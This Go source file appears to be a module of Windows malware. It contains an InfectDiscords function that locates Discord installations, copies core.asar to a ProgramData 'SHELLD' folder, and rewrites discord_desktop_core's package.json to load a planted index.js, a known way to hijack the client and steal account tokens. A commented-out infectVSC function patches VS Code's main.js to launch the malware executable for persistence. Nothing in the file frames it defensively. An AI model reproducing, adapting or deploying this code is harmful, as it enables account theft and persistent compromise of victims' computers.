package main

import (
	"os"
	"path/filepath"
	"strings"
)

func InfectDiscords() {
	var discords []string
	var injectPath []string
	files, _ := os.ReadDir(os.Getenv("localappdata"))
	for _, file := range files {
		filename := file.Name()
		if strings.Contains(filename, "iscord") {
			discords = append(discords, os.Getenv("localappdata")+"\\"+filename)
		}
	}
	for _, discord := range discords {
		pattern := discord + "\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\package.json"
		pattern2 := discord + "\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\core.asar"
		files, _ := filepath.Glob(pattern)
		cores, _ := filepath.Glob(pattern2)
		_, err := copyy(cores[0], os.Getenv("programdata")+"\\SHELLD\\core.asar")
		if err != nil {
			return
		}

		for _, file := range files {
			injectPath = append(injectPath, file)
		}
	}
	text := `{"name":"discord_desktop_core","version":"0.0.0","private":"true","main":"` + strings.Replace(os.Getenv("programdata"), "\\", "/", 1) + `\\SHELLD\\index.js"}`
	for _, file := range injectPath {
		os.WriteFile(file, []byte(text), 0644)
	}
}

// func infectVSC() {
// 	local := os.Getenv("localappdata")

// 	path := local + "\\Programs\\Microsoft VS Code\\resources\\app\\out\\main.js"
// 	_, err := os.Stat(path)
// 	if os.IsNotExist(err) {
// 		return
// 	}
// 	data, err := os.ReadFile(path)
// 	if err != nil {
// 		return
// 	}
// 	strData := string(data)
// 	exec, err := os.Executable()
// 	if err != nil {
// 		return
// 	}
// 	executable := strings.ReplaceAll(exec, `\`, `\\`)
// 	infData := strings.Replace(strData, "const perf=require", `var {execFile} = require("child_process");execFile("`+executable+`");const perf=require`, 1)
// 	err = os.WriteFile(path, []byte(infData), 0644)
// 	if err != nil {
// 		return
// 	}
// }
func Infect() {
	InfectDiscords()
}
